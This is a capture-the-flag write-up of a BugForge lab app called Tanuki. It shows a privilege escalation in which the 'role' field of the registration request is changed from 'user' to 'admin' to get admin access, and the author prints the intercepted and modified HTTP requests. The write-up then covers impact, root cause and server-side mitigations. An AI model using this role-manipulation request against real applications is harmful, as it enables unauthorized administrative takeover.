---
title: "Broken Access Control – Role Manipulation via User Registration | Tanuki"
date: 2026-04-28 00:00:00 +0530
categories: [Web Security]
tags: [broken-access-control, privilege-escalation, role-manipulation, burpsuite, api-testing, authorization-flaw, bugforge, express]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/bac-bugforge.webp
  alt: Broken Access Control in Tanuki
---

## Overview
Tanuki is a web application that includes a user registration system with role-based access control. During testing, a critical authorization flaw was discovered where the client was able to directly influence privileged account attributes during registration.

This resulted in **horizontal-to-vertical privilege escalation** by modifying the `role` parameter.

---

## Objective
- Analyze registration workflow
- Identify insecure API parameters
- Test for client-side role manipulation
- Escalate privileges from user to admin
- Access restricted admin functionality

---

## Reconnaissance

### Registration Request Observation
While registering a new account and intercepting traffic in Burp Suite, the following request was captured:

```http
POST /api/register HTTP/2
Host: lab-1777423988495-cruir7.labs-app.bugforge.io
Content-Type: application/json

{
  "username": "kelvin",
  "email": "kel@gmail.com",
  "password": "kelvin",
  "full_name": "kelvin",
  "role": "user"
}
```

### Key Observation

* The `role` parameter is directly provided by the client
* No visible restriction or server-side enforcement is observed
* This indicates a potential Broken Access Control (BAC) issue

In secure systems, roles should always be assigned server-side, not trusted from user input.

## Exploitation

### Step 1: Intercepting the Request

Using Burp Suite, the registration request was intercepted before being sent to the server.

The goal was to test whether the backend validates or enforces the `role` field.

### Step 2: Role Manipulation

The `role` value was modified from:

```json
"role": "user"
```

to:

```json
"role": "admin"
```

### Modified Request

```http
POST /api/register HTTP/2
Host: lab-1777423988495-cruir7.labs-app.bugforge.io
Content-Type: application/json

{
  "username": "kelvin1",
  "email": "kel1@gmail.com",
  "password": "kelvin",
  "full_name": "kelvin1",
  "role": "admin"
}
```

### Result

The server accepted the modified request without validation or rejection.

### Outcome

* Account successfully created
* User assigned admin privileges at creation time

This confirms that the backend blindly trusts client-provided `role` values.

## Proof of Exploitation

After logging in with the modified account, administrative access was granted.

* Admin dashboard became accessible
* Restricted functionalities were unlocked
* Flag was available inside the admin panel

🚩 Flag Location: Admin Dashboard

## Impact

This vulnerability leads to critical privilege escalation, allowing attackers to:

* Create unauthorized admin accounts
* Access sensitive administrative features
* Modify or delete application data
* Bypass intended role-based access control (RBAC)
* Gain full control over application functionality

In real-world systems, this can result in complete application compromise.

## Root Cause

The vulnerability exists due to:

* Trusting client-side input for authorization decisions
* Missing server-side role assignment logic
* Lack of input validation on sensitive fields
* Improper implementation of RBAC

The backend should never allow users to define their own privilege level.

## Mitigation

To prevent this type of vulnerability:

* Assign roles only on the server side
* Ignore or reject client-provided role fields
* Implement strict RBAC checks on backend
* Validate all sensitive parameters
* Use predefined role mappings stored securely
* Apply principle of least privilege by default

**Example secure approach:**

* New users always default to `user` role
* Admin roles assigned only by existing admins

## Real-World Insight

Broken Access Control is consistently ranked among the top critical web vulnerabilities.

Attackers often look for:

* Hidden role parameters in APIs
* Frontend-only restrictions
* Trust-based backend logic

Even a single overlooked parameter like `role` can lead to full administrative takeover, making this one of the most dangerous yet common API security flaws.

## Conclusion

This lab demonstrates how insecure handling of authorization data can lead to immediate privilege escalation.

Attack flow:

Registration → Intercept Request → Modify Role → Admin Access → Flag Retrieval

It highlights the importance of enforcing authorization strictly on the server side rather than trusting client-controlled data.